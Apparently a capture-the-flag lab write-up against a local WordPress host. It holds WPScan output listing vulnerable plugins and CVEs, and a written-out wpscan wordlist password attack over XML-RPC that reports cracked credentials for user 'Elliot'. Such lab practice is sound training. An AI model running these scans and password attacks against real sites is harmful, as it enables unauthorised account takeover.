 | Readme: https://192.168.1.6/wp-content/plugins/jetpack/readme.txt
 | [!] The version is out of date, the latest version is 16.3.1
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - https://192.168.1.6/wp-content/plugins/jetpack/, status: 403
 |
 | [!] 20 vulnerabilities identified:
 |
 | [!] Title: Jetpack 3.0-3.4.2 - Cross-Site Scripting (XSS)
 |     Fixed in: 3.4.3
 |     References:
 |      - https://wpscan.com/vulnerability/41daa89d-1134-476b-be71-9e2340ab8538
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-9359
 |      - https://blog.sucuri.net/2015/04/security-advisory-xss-vulnerability-affecting-multiple-wordpress-plugins.html
 |      - https://jetpack.me/2015/04/20/jetpack-3-4-3-coordinated-security-update/
 |
 | [!] Title: Jetpack <= 3.5.2 - Unauthenticated DOM Cross-Site Scripting (XSS)
 |     Fixed in: 3.5.3
 |     References:
 |      - https://wpscan.com/vulnerability/2765d571-059b-4d6f-948c-3ca7b9febcdc
 |      - https://blog.sucuri.net/2015/05/jetpack-and-twentyfifteen-vulnerable-to-dom-based-xss-millions-of-wordpress-websites-affected-millions-of-wordpress-websites-affected.html
 |
 | [!] Title: Jetpack <= 3.7.0 - Stored Cross-Site Scripting (XSS)
 |     Fixed in: 3.7.1
 |     References:
 |      - https://wpscan.com/vulnerability/dad3ea5b-2420-4022-b26d-769f63ed01e7
 |      - https://jetpack.me/2015/09/30/jetpack-3-7-1-and-3-7-2-security-and-maintenance-releases/
 |      - https://blog.sucuri.net/2015/10/security-advisory-stored-xss-in-jetpack.html
 |
 | [!] Title: Jetpack <= 3.7.0 - Information Disclosure
 |     Fixed in: 3.7.1
 |     References:
 |      - https://wpscan.com/vulnerability/f36531a9-1670-4122-9f41-afcf71376375
 |      - https://jetpack.me/2015/09/30/jetpack-3-7-1-and-3-7-2-security-and-maintenance-releases/
 |
 | [!] Title: Jetpack <= 3.9.1 - LaTeX HTML Element XSS
 |     Fixed in: 3.9.2
 |     References:
 |      - https://wpscan.com/vulnerability/2a2f5da6-497f-4513-ad62-2f6f52b1852f
 |      - https://jetpack.com/2016/02/25/jetpack-3-9-2-maintenance-and-security-release/
 |      - https://github.com/Automattic/jetpack/commit/dbc33b9105c4dbb0de81544e682a8b6d5ab7e446
 |
 | [!] Title: Jetpack 2.0-4.0.2 - Shortcode Stored Cross-Site Scripting (XSS)
 |     Fixed in: 4.0.3
 |     References:
 |      - https://wpscan.com/vulnerability/957ab0b9-2acb-4f46-93e6-30ad4fcb7fef
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10706
 |      - https://jetpack.com/2016/05/27/jetpack-4-0-3-critical-security-update/
 |      - http://wptavern.com/jetpack-4-0-3-patches-a-critical-xss-vulnerability
 |      - https://blog.sucuri.net/2016/05/security-advisory-stored-xss-jetpack-2.html
 |
 | [!] Title: Jetpack <= 4.0.3 - Multiple Vulnerabilities
 |     Fixed in: 4.0.4
 |     References:
 |      - https://wpscan.com/vulnerability/21bd1537-801a-48ec-9c5f-72d9efb6801d
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10705
 |      - https://jetpack.com/2016/06/20/jetpack-4-0-4-bug-fixes/
 |
 | [!] Title: Jetpack < 6.5 - Authenticated Stored Cross-Site Scripting (XSS)
 |     Fixed in: 6.5
 |     References:
 |      - https://wpscan.com/vulnerability/5e63453f-4d95-4bc3-9338-2d77f95f9ee7
 |      - https://www.ripstech.com/php-security-calendar-2018/#day-11
 |
 | [!] Title: Jetpack 5.1-7.9 - Vulnerability in Shortcode Embed Code 
 |     Fixed in: 7.9.1
 |     References:
 |      - https://wpscan.com/vulnerability/7105cb30-e393-4c79-aeb7-7439bd560738
 |      - https://jetpack.com/2019/11/19/jetpack-7-9-1-maintenance-security/
 |      - https://plugins.trac.wordpress.org/changeset/2196895/jetpack
 |      - https://github.com/Automattic/jetpack/commit/5e38904da8eda0bc86b29fd5298c222e362583df
 |
 | [!] Title: Jetpack < 9.8 - Carousel Module Non-Published Page/Post Attachment Comment Leak
 |     Fixed in: 9.8
 |     References:
 |      - https://wpscan.com/vulnerability/08a8a51c-49d3-4bce-b7e0-e365af1d8f33
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24374
 |      - https://jetpack.com/2021/06/01/jetpack-9-8-engage-your-audience-with-wordpress-stories/
 |      - https://plugins.trac.wordpress.org/changeset/2541817/jetpack
 |
 | [!] Title: Jetpack < 12.1.1 - Author+ Arbitrary File Manipulation via API
 |     Fixed in: 12.1.1
 |     References:
 |      - https://wpscan.com/vulnerability/52d221bd-ae42-435d-a90a-60a5ae530663
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-2996
 |      - https://jetpack.com/blog/jetpack-12-1-1-critical-security-update/
 |
 | [!] Title: Jetpack < 12.8-a.3 - Contributor+ Stored XSS via block attribute
 |     Fixed in: 12.8-a.3
 |     References:
 |      - https://wpscan.com/vulnerability/4478c8d3-0c7f-43a0-9354-46795e0e6fbc
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-45050
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/824360ab-c797-465a-8480-baeae941af29
 |
 | [!] Title: Jetpack < 12.7 - Improper Authorization via WPCom External Media REST endpoints
 |     Fixed in: 12.7
 |     References:
 |      - https://wpscan.com/vulnerability/cce4ac0a-777f-4dde-b86e-614a224dbf6e
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-47788
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/e62fa16f-a4a1-44a7-9a66-abafd8dddf67
 |
 | [!] Title: Jetpack < 12.7 - Authenticated(Contributor+) Clickjacking via Iframe Injection
 |     Fixed in: 12.7
 |     References:
 |      - https://wpscan.com/vulnerability/01a0ffcd-3bf6-434c-9fd0-d5570ed4f336
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-47774
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/92a3e622-b3b2-450e-82a7-0a942711e8c0
 |
 | [!] Title: Jetpack < 13.2.1 - Contributor+ Stored XSS
 |     Fixed in: 13.2.1
 |     Reference: https://wpscan.com/vulnerability/bfed3099-bd41-4988-a76b-2b9349051879
 |
 | [!] Title: Jetpack < 13.4 - Contributor+ Stored Cross-Site Scripting via wpvideo Shortcode
 |     Fixed in: 13.4
 |     References:
 |      - https://wpscan.com/vulnerability/5649d116-5263-41e9-87b4-1cb71f12d419
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-4392
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/11dceac7-7ff8-4384-9046-919c38947c32
 |
 | [!] Title: Jetpack < 13.8 - Unauthenticated Arbitrary Block & Shortcode Execution
 |     Fixed in: 13.8
 |     References:
 |      - https://wpscan.com/vulnerability/a984976c-291a-4f68-90d4-e452605ea7d1
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-10075
 |
 | [!] Title: Jetpack < 13.8, Boost < 3.4.8 - Contributor+ Stored XSS
 |     Fixed in: 13.8
 |     References:
 |      - https://wpscan.com/vulnerability/15f278f6-0418-4c83-b925-b1a2d8c53e2f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-10076
 |
 | [!] Title: Jetpack < 16.3 - Authentication Bypass via Account Protection Multisite Capability Check
 |     Fixed in: 16.3
 |     References:
 |      - https://wpscan.com/vulnerability/b5099232-1d45-4714-815b-65eebb498ff7
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-106601
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/6083232b-7987-467e-8f9c-2b28536e6b5d
 |
 | [!] Title: Jetpack < 16.3 - Authentication Bypass via Account Protection Verification Code Brute Force
 |     Fixed in: 16.3
 |     References:
 |      - https://wpscan.com/vulnerability/6126368f-f1e5-4e77-bbc8-5aad87255e5e
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-106602
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/83fe5090-744e-4541-8015-34a8256f256e
 |
 | Version: 3.3.2 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - https://192.168.1.6/wp-content/plugins/jetpack/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - https://192.168.1.6/wp-content/plugins/jetpack/readme.txt

[+] simple-tags
 | Location: https://192.168.1.6/wp-content/plugins/simple-tags/
 | Last Updated: 2026-10-05T10:37:00.000Z
 | Readme: https://192.168.1.6/wp-content/plugins/simple-tags/readme.txt
 | [!] The version is out of date, the latest version is 4.0.0
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - https://192.168.1.6/wp-content/plugins/simple-tags/, status: 403
 |
 | [!] 14 vulnerabilities identified:
 |
 | [!] Title: TaxoPress < 3.0.7.2 - Authenticated Stored Cross-Site Scripting (XSS)
 |     Fixed in: 3.0.7.2
 |     References:
 |      - https://wpscan.com/vulnerability/a31321fe-adc6-4480-a220-35aedca52b8b
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24444
 |
 | [!] Title: TaxoPress < 3.4.5 - Reflected Cross-Site Scripting
 |     Fixed in: 3.4.5
 |     Reference: https://wpscan.com/vulnerability/b5509e79-1f17-48be-afcb-26329112dd9f
 |
 | [!] Title: TaxoPress < 3.6.5 - Editor+ Stored XSS
 |     Fixed in: 3.6.5
 |     References:
 |      - https://wpscan.com/vulnerability/bcba8a87-4c9e-4b0e-a47e-f89da994d1c3
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-2168
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-2169
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-2170
 |
 | [!] Title: WordPress Tag and Category Manager – AI Autotagger < 3.20.0 - Authenticated (Contributor+) Stored Cross-Site Scripting via Shortcode
 |     Fixed in: 3.20.0
 |     References:
 |      - https://wpscan.com/vulnerability/94b2bf74-481d-473d-b57d-ab28ea933e34
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-2830
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/0f537479-d5ec-46bb-a04e-2c33a2abc759
 |
 | [!] Title: AI Autotagger < 3.30.0 - Admin+ Stored XSS
 |     Fixed in: 3.30.0
 |     References:
 |      - https://wpscan.com/vulnerability/30fbe3c5-f190-48e8-a6bb-e8d78e001e7f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-0627
 |      - https://research.cleantalk.org/cve-2025-0627/
 |
 | [!] Title: Tag, Category, and Taxonomy Manager – AI Autotagger with OpenAI < 3.37.3 - Authenticated (Subscriber+) Information Exposure
 |     Fixed in: 3.37.3
 |     References:
 |      - https://wpscan.com/vulnerability/ef49e7fc-79d0-488b-8ae8-cc54bfa9be29
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-55710
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/d63a8ec5-043d-4263-a7f3-8c117d1fb0b7
 |
 | [!] Title: Tag, Category, and Taxonomy Manager – AI Autotagger with OpenAI < 3.40.1 - Authenticated (Editor+) SQL Injection
 |     Fixed in: 3.40.1
 |     References:
 |      - https://wpscan.com/vulnerability/14e746b6-0641-4014-900c-54dda973f4ce
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-11972
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/7e36f3a0-2215-4c1c-99c4-9405ad7b913b
 |
 | [!] Title: Tag, Category, and Taxonomy Manager – AI Autotagger with OpenAI < 3.41.0 - Missing Authorization to Authenticated (Subscriber+) Arbitrary Taxonomy Term Manipulation
 |     Fixed in: 3.41.0
 |     References:
 |      - https://wpscan.com/vulnerability/20bce30b-021c-484f-a287-93b8e5924ea0
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-13354
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/05c1ee52-02c9-440b-9269-14ea8b73be45
 |
 | [!] Title: Tag, Category, and Taxonomy Manager – AI Autotagger with OpenAI < 3.41.0 - Authenticated (Contributor+) SQL Injection
 |     Fixed in: 3.41.0
 |     References:
 |      - https://wpscan.com/vulnerability/40ae3a53-2573-40cb-9438-8005f96e0efe
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-13359
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/d9bebdc0-1625-4dc4-8c92-37f379868cd5
 |
 | [!] Title: Tag, Category, and Taxonomy Manager – AI Autotagger with OpenAI < 3.41.0 - Authenticated (Contributor+) SQL Injection via ORDER BY Clause
 |     Fixed in: 3.41.0
 |     References:
 |      - https://wpscan.com/vulnerability/19460368-4b17-43e6-a35d-69fc86b6ddbd
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-13922
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/f40cc632-c6af-4c8b-a455-76319f7fe151
 |
 | [!] Title: TaxoPress < 3.42.0 - Missing Authorization to Authenticated (Contributor+) Arbitrary Post Tag Modification
 |     Fixed in: 3.42.0
 |     References:
 |      - https://wpscan.com/vulnerability/514be889-38fd-4f49-bd89-f0f1bbea49f4
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-14371
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/1ef51ffb-df1e-442d-abc8-3a0308099a0b
 |
 | [!] Title: TaxoPress < 3.45.0 - Authenticated (Editor+) SQL Injection
 |     Fixed in: 3.45.0
 |     References:
 |      - https://wpscan.com/vulnerability/aabdcc3e-19d9-41c1-9754-bb79d6351b48
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-42646
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/47fe3de6-6c7b-4af3-8604-06f4522a36f2
 |
 | [!] Title: TaxoPress < 3.51.0 - Contributor+ Private Post Disclosure via IDOR
 |     Fixed in: 3.51.0
 |     References:
 |      - https://wpscan.com/vulnerability/5980ab15-bc6e-4298-9d0c-92c17217ec2c
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-15231
 |
 | [!] Title: Tag, Category, and Taxonomy Manager – Autotagger Automatically Add Terms < 3.52.0 - Authenticated (Editor+) PHP Object Injection
 |     Fixed in: 3.52.0
 |     References:
 |      - https://wpscan.com/vulnerability/9c32fb90-5f51-40d3-ad92-cb6502fd8e3e
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-74012
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/67910b99-6024-4b24-9c55-4b1cb0ddfa45
 |
 | Version: 2.4.1 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - https://192.168.1.6/wp-content/plugins/simple-tags/readme.txt

[+] wp-mail-smtp
 | Location: https://192.168.1.6/wp-content/plugins/wp-mail-smtp/
 | Last Updated: 2026-10-08T14:50:00.000Z
 | Readme: https://192.168.1.6/wp-content/plugins/wp-mail-smtp/readme.txt
 | [!] The version is out of date, the latest version is 4.10.2
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - https://192.168.1.6/wp-content/plugins/wp-mail-smtp/, status: 403
 |
 | [!] 2 vulnerabilities identified:
 |
 | [!] Title: WP Mail SMTP by WPForms < 1.4.0 - Authenticated Stored Cross-Site Scripting (XSS)
 |     Fixed in: 1.4.0
 |     References:
 |      - https://wpscan.com/vulnerability/6f7a35d7-b6ec-416b-81f1-2fc54df9c92e
 |      - https://www.ripstech.com/php-security-calendar-2018/
 |      - https://plugins.trac.wordpress.org/changeset/1982773/wp-mail-smtp
 |
 | [!] Title: WP Mail SMTP < 4.1.0 - Admin+ SMTP Password Exposure
 |     Fixed in: 4.1.0
 |     References:
 |      - https://wpscan.com/vulnerability/896df679-4eb4-465b-971f-31783f36acba
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-6694
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/2d4e9daf-d414-4ace-9efd-4c3e16deeb8f
 |
 | Version: 0.9.5 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - https://192.168.1.6/wp-content/plugins/wp-mail-smtp/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - https://192.168.1.6/wp-content/plugins/wp-mail-smtp/readme.txt

[+] wptouch
 | Location: https://192.168.1.6/wp-content/plugins/wptouch/
 | Last Updated: 2025-12-04T09:53:00.000Z
 | Readme: https://192.168.1.6/wp-content/plugins/wptouch/readme.txt
 | [!] The version is out of date, the latest version is 4.3.62
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - https://192.168.1.6/wp-content/plugins/wptouch/, status: 403
 |
 | [!] 5 vulnerabilities identified:
 |
 | [!] Title: WPtouch Mobile Plugin < 3.7.6 - Cross-Site Scripting (XSS)
 |     Fixed in: 3.7.6
 |     References:
 |      - https://wpscan.com/vulnerability/d43304ac-b2f5-44c3-8ac2-8db728dba4e3
 |      - https://blog.sucuri.net/2015/04/security-advisory-xss-vulnerability-affecting-multiple-wordpress-plugins.html
 |
 | [!] Title: WPtouch < 4.3.44 - Reflected Cross-Site Scripting
 |     Fixed in: 4.3.44
 |     Reference: https://wpscan.com/vulnerability/7dbd8348-9c5d-4d62-a0f4-2b7c2b7e58e4
 |
 | [!] Title: WPtouch < 4.3.45 - Admin+ Arbitrary File Upload
 |     Fixed in: 4.3.45
 |     References:
 |      - https://wpscan.com/vulnerability/f927dbe0-3939-4882-a469-1309ac737ee6
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3416
 |
 | [!] Title: WPtouch < 4.3.45 - Admin+ PHP Object Injection
 |     Fixed in: 4.3.45
 |     References:
 |      - https://wpscan.com/vulnerability/55772932-eebd-475b-b5df-e80fab288ee5
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3417
 |
 | [!] Title: WPtouch < 4.3.61 - Authenticated (Administrator+) Stored Cross-Site Scripting
 |     Fixed in: 4.3.61
 |     References:
 |      - https://wpscan.com/vulnerability/25aae5a9-510a-4011-8c65-dc8d2c54895e
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-49318
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/996843e5-4fbc-4606-a383-2a5825fae89c
 |
 | Version: 3.7.3 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - https://192.168.1.6/wp-content/plugins/wptouch/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - https://192.168.1.6/wp-content/plugins/wptouch/readme.txt

[+] Enumerating All Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:14:49 <=========================================================================> (33491 / 33491) 100.00% Time: 00:14:49
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] Theme(s) Identified:

[+] twentyfifteen
 | Location: https://192.168.1.6/wp-content/themes/twentyfifteen/
 | Last Updated: 2026-05-20T00:00:00.000Z
 | Readme: https://192.168.1.6/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 4.2
 | Style URL: https://192.168.1.6/wp-content/themes/twentyfifteen/style.css
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen/
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Urls In 404 Page (Passive Detection)
 | Confirmed By: Known Locations (Aggressive Detection)
 |  - https://192.168.1.6/wp-content/themes/twentyfifteen/, status: 500
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Aggressive Detection)
 |  - https://192.168.1.6/wp-content/themes/twentyfifteen/style.css, Match: 'Version: 1.3'

[+] twentyfourteen
 | Location: https://192.168.1.6/wp-content/themes/twentyfourteen/
 | Last Updated: 2026-05-20T00:00:00.000Z
 | Readme: https://192.168.1.6/wp-content/themes/twentyfourteen/readme.txt
 | [!] The version is out of date, the latest version is 4.5
 | Style URL: https://192.168.1.6/wp-content/themes/twentyfourteen/style.css
 | Style Name: Twenty Fourteen
 | Style URI: https://wordpress.org/themes/twentyfourteen/
 | Description: In 2014, our default theme lets you create a responsive magazine website with a sleek, modern design...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - https://192.168.1.6/wp-content/themes/twentyfourteen/, status: 500
 |
 | Version: 1.5 (80% confidence)
 | Found By: Style (Aggressive Detection)
 |  - https://192.168.1.6/wp-content/themes/twentyfourteen/style.css, Match: 'Version: 1.5'

[+] twentythirteen
 | Location: https://192.168.1.6/wp-content/themes/twentythirteen/
 | Last Updated: 2026-05-20T00:00:00.000Z
 | Readme: https://192.168.1.6/wp-content/themes/twentythirteen/readme.txt
 | [!] The version is out of date, the latest version is 4.6
 | Style URL: https://192.168.1.6/wp-content/themes/twentythirteen/style.css
 | Style Name: Twenty Thirteen
 | Style URI: https://wordpress.org/themes/twentythirteen/
 | Description: The 2013 theme for WordPress takes us back to the blog, featuring a full range of post formats, each...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - https://192.168.1.6/wp-content/themes/twentythirteen/, status: 500
 |
 | Version: 1.6 (80% confidence)
 | Found By: Style (Aggressive Detection)
 |  - https://192.168.1.6/wp-content/themes/twentythirteen/style.css, Match: 'Version: 1.6'

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:03 <==============================================================================> (137 / 137) 100.00% Time: 00:00:03

[i] No Config Backups Found.

[+] Enumerating DB Exports (via Passive and Aggressive Methods)
 Checking DB Exports - Time: 00:00:01 <====================================================================================> (75 / 75) 100.00% Time: 00:00:01

[i] No DB Exports Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <===============================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] No Users Found.

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 17
 | Requests Remaining: 9

[+] Finished: Sat Oct 17 08:43:12 2026
[+] Requests Done: 168382
[+] Cached Requests: 27
[+] Data Sent: 44.538 MB
[+] Data Received: 54.078 MB
[+] Memory used: 560.527 MB
[+] Elapsed time: 03:39:44


```




![[Pasted image 20261017151207.png]]

![[Pasted image 20261017151233.png]]


![[Pasted image 20261017151443.png]]


![[Pasted image 20261017152059.png]]


![[Pasted image 20261017152248.png]]


![[Pasted image 20261017152340.png]]









![[Pasted image 20261017174813.png]]


![[Pasted image 20261017174844.png]]

![[Pasted image 20261017174902.png]]


![[Pasted image 20261017174947.png]]


![[Pasted image 20261017175104.png]]


![[Pasted image 20261017175228.png]]


![[Pasted image 20261017180028.png]]



```
 wpscan --url  http://192.168.1.6  --passwords robots.dic --usernames Elliot
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.1.6/ [192.168.1.6]
[+] Started: Sat Oct 17 07:41:17 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache
 |  - X-Mod-Pagespeed: 1.9.32.3-4523
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://192.168.1.6/robots.txt
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.1.6/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] The external WP-Cron seems to be enabled: http://192.168.1.6/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://192.168.1.6/0aecf00.html, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.3.1'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://192.168.1.6/0aecf00.html, Match: 'WordPress 4.3.1'

[+] WordPress theme in use: twentyfifteen
 | Location: http://192.168.1.6/wp-content/themes/twentyfifteen/
 | Last Updated: 2026-05-20T00:00:00.000Z
 | Readme: http://192.168.1.6/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 4.2
 | Style URL: http://192.168.1.6/wp-content/themes/twentyfifteen/style.css?ver=4.3.1
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen/
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.1.6/wp-content/themes/twentyfifteen/style.css?ver=4.3.1, Match: 'Version: 1.3'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:11 <==============================================================================> (137 / 137) 100.00% Time: 00:00:11

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc Multicall against 1 user/s
[SUCCESS] - Elliot / ER28-0652                                                                                                                               
All Found                                                                                                                                                    
Progress Time: 00:05:53 <=====================================================                                              > (12 / 22) 54.54%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: Elliot, Password: ER28-0652

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sat Oct 17 07:47:25 2026
[+] Requests Done: 152
[+] Cached Requests: 41
[+] Data Sent: 1.621 MB
[+] Data Received: 1.282 MB
[+] Memory used: 280.715 MB
[+] Elapsed time: 00:06:07
  
```


![[Pasted image 20261017175413.png]]



![[Pasted image 20261017175438.png]]



![[Pasted image 20261017175506.png]]



![[Pasted image 20261017180509.png]]



![[Pasted image 20261017180538.png]]


![[Pasted image 20261017180603.png]]

![[Pasted image 20261017180618.png]]


![[Pasted image 20261017181335.png]]


![[Pasted image 20261017181356.png]]


![[Pasted image 20261017181516.png]]




![[Pasted image 20261017183717.png]]



![[Pasted image 20261017184210.png]]

